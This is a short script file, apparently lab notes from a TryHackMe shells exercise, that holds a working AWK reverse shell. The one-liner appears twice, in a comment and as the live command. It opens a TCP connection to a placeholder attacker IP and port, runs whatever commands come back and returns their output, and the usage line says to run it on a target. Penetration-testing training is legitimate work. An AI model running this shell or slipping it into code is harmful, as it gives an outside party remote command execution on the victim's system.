# AWK Reverse Shell
# Source: TryHackMe - Shells Overview, Task 6
# Usage: replace ATTACKER_IP and PORT, then run on target
#
#   awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/PORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
#
# Uses AWK's built-in TCP capabilities (/inet/tcp/) to connect to attacker.
# Reads commands from attacker, executes them, sends results back over the socket.

awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/PORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
